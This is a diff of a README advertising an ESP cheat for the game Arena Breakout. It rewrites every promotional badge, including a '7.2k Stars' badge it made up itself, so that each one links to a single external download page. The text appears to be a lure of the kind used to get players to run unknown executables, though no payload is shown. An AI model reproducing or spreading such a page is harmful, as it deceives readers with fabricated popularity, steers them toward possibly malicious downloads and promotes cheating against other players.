@@ -11,10 +11,10 @@ Arena Breakout is unforgiving—every second counts. This cheat provides **ESP h
 \[!IMPORTANT]
 Cheat tools are for **testing and experimental use only**. Always keep backups of your progress before activating.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-blue?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 7.2k Stars](https://img.shields.io/badge/⭐️%207.2k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-blue?style=for-the-badge\&logo=rocket)](https://arena-breakout-tool.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-green?style=for-the-badge\&logo=windows)](https://arena-breakout-tool.github.io/.github/)
+[![⭐️ 7.2k Stars](https://img.shields.io/badge/⭐️%207.2k-Stars-yellow?style=for-the-badge\&logo=github)](https://arena-breakout-tool.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-orange?style=for-the-badge\&logo=github)](https://arena-breakout-tool.github.io/.github/)
 
 ---
 
